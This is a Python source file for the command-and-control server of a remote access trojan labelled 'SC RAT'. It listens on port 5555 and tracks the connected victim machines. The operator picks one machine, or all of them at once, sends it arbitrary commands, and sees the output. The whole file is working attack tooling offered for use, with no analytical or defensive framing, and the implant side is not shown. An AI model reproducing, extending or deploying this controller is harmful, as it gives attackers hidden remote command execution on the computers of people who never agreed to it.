import socket
import threading
import os
from colorama import Fore
import ctypes


clients = {}

def logo():
    print(f"{Fore.GREEN}  /$$$$$$   /$$$$$$        /$$$$$$$   /$$$$$$  /$$$$$$$$")
    print(f" /$$__  $$ /$$__  $$      | $$__  $$ /$$__  $$|__  $$__/")
    print(f"| $$  \__/| $$  \__/      | $$  \ $$| $$  \ $$   | $$   ")
    print(f"|  $$$$$$ | $$            | $$$$$$$/| $$$$$$$$   | $$   ")
    print(f"{Fore.MAGENTA} \____  $$| $$            | $$__  $$| $$__  $$   | $$   ")
    print(f" /$$  \ $$| $$    $$      | $$  \ $$| $$  | $$   | $$   ")
    print(f"|  $$$$$$/|  $$$$$$/      | $$  | $$| $$  | $$   | $$   ")
    print(f" \______/  \______/       |__/  |__/|__/  |__/   |__/   {Fore.RESET}")


def handle_client(client_socket, addr):
    clients[addr] = client_socket
    ctypes.windll.kernel32.SetConsoleTitleW(f"SC RAT | CONNECTED CLIENTS: {len(clients)}")

    while True:
        try:
            response = client_socket.recv(4096).decode()
            if not response:
                break
            print(f"\n{Fore.GREEN}[{addr[0]} Output]: {Fore.RESET}{response}")
        except (ConnectionResetError, BrokenPipeError):
            break

    print(f"\n{Fore.RESET}[{Fore.RED}!{Fore.RESET}] Client {addr[0]} disconnected.")
    client_socket.close()
    del clients[addr]

def accept_clients(server):
    while True:
        client_socket, addr = server.accept()
        threading.Thread(target=handle_client, args=(client_socket, addr), daemon=True).start()


def start_server(host="0.0.0.0", port=5555):
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.bind((host, port))
    server.listen(5)
    print(f"[*] Listening on {host}:{port}")

    
    
    threading.Thread(target=accept_clients, args=(server,), daemon=True).start()
    os.system("cls")
    logo()
    print(f"[{Fore.YELLOW}?{Fore.RESET}] Waiting for clients to connect...")

    while True:
        if not clients:
            continue


        print("\n[Connected Clients]")
        for idx, addr in enumerate(clients.keys(), start=1):
            print(f"{idx}. {addr[0]}:{addr[1]}")


        try:
            choice = int(input("Select client number (or 0 to broadcast): ")) - 1
        except ValueError:
            continue


        if choice == -1:
            command = input("Enter command to send (broadcast): ")
            for client in clients.values():
                client.send(command.encode())
        elif 0 <= choice < len(clients):
            target_addr = list(clients.keys())[choice]
            command = input(f"Enter command to send to {target_addr[0]}: ")
            clients[target_addr].send(command.encode())
        else:
            print("[!] Invalid selection.")

if __name__ == "__main__":
    start_server()
